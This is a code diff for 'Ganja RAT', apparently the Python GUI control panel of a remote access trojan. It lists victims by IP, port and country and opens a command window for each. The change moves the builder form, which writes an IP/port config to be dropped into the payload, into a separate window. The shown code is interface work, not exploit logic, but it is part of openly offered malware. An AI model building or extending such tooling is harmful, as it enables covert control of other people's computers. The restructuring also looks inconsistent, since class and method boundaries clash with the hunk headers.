@@ -151,8 +151,6 @@ class GanjaRATApp(ctk.CTk):
         server_thread.start()
 
         self.create_app()
-        self.create_config_app() 
-
 
     def create_app(self):
         self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='green')
@@ -166,25 +164,11 @@ class GanjaRATApp(ctk.CTk):
         self.text_ip = ctk.CTkLabel(self.menu, text='IP', text_color='white', font=('Bold', 20))
         self.text_port = ctk.CTkLabel(self.menu, text='PORT', text_color='white', font=('Bold', 20))
         self.text_contry = ctk.CTkLabel(self.menu, text='CONTRY', text_color='white', font=('Bold', 20))
+        self.builder_btn = ctk.CTkButton(self.menu, height=10, text='BUILD', text_color='red', font=('Bold', 15), fg_color='black', command=self.draw_config_app)
         self.text_ip.pack(side='left', padx=75)
         self.text_port.pack(side='left', padx=75)
         self.text_contry.pack(side='left', padx=75)
-
-    def create_config_app(self):
-        self.login_frame = ctk.CTkFrame(self, fg_color="gray30", corner_radius=10)
-        self.login_frame.pack(pady=40, padx=20, fill="both", expand=True)
-
-        self.login_title = ctk.CTkLabel(self.login_frame, text='Build config file', text_color='green', font=('Bold', 60))
-        self.login_title.pack(side='top', pady=10)
-
-        self.entry_ip = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="IP", text_color='green', font=('Bold', 50))
-        self.entry_ip.pack(pady=10, padx=20)
-
-        self.entry_port = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="PORT", text_color='green', font=('Bold', 50))
-        self.entry_port.pack(pady=10, padx=20)
-
-        self.btn = ctk.CTkButton(self.login_frame, width=250, height=50, text="Enter", command=self.remove_frame)
-        self.btn.pack()
+        self.builder_btn.pack(side='right', padx=15)
 
     def create_user(self, ip, port, country):
         user_ground = ctk.CTkFrame(self, width=970, height=150, fg_color='green', corner_radius=10)
@@ -213,9 +197,40 @@ class GanjaRATApp(ctk.CTk):
         for user in users:
             self.create_user(user["ip"], user["port"], user["country"])
 
+    def draw_config_app(self):
+        self.config_app = ConfigApp(self) 
+        self.config_app.grab_set() 
+
     def draw_func_app(self, ip, port):
         func_app = FunctionApp(ip, port)
         threading.Thread(target=func_app.mainloop())
+
+
+class ConfigApp(ctk.CTkToplevel): 
+    def __init__(self, parent):
+        super().__init__(parent) 
+
+        self.title("Build Config")
+        self.geometry("600x500")
+        self.resizable(False, False)
+
+        self.create_app()
+
+    def create_app(self):
+        self.login_frame = ctk.CTkFrame(self, fg_color="gray30", corner_radius=10)
+        self.login_frame.pack(side='top', pady=40, padx=20, fill="both", expand=True)
+
+        self.login_title = ctk.CTkLabel(self.login_frame, text='Build config file', text_color='green', font=('Bold', 60))
+        self.login_title.pack(side='top', pady=10)
+
+        self.entry_ip = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="IP", text_color='green', font=('Bold', 50))
+        self.entry_ip.pack(pady=10, padx=20)
+
+        self.entry_port = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="PORT", text_color='green', font=('Bold', 50))
+        self.entry_port.pack(pady=10, padx=20)
+
+        self.btn = ctk.CTkButton(self.login_frame, width=250, height=50, text="Enter", command=self.remove_frame)
+        self.btn.pack()
 
     def build_info_file(self, ip, port):
         config_info_list = [f'{ip}\n', f'{port}\n']
@@ -229,14 +244,13 @@ class GanjaRATApp(ctk.CTk):
     def remove_frame(self):
         ip = self.entry_ip.get()
         port = self.entry_port.get()
-        
         build = self.build_info_file(ip, port)
         if build:
-            self.login_frame.destroy()
-            self.create_users_app(self.users)
-            messagebox.showinfo('Ganja RAT', 'Config file has been built, drop this to main file')
+            messagebox.showinfo('Ganja RAT', 'Config file has been build, drop this to main file')
         else:
             messagebox.showerror('Ganja RAT', 'Build config file has been not complete! Error')
+        
+        self.destroy()
 
 
 class FunctionApp(ctk.CTk):
@@ -248,7 +262,7 @@ class FunctionApp(ctk.CTk):
 
         self.title("Function")
         self.geometry("600x500")
-
+        
         self.comm = CommandFunction()
 
         self.create_func_app()
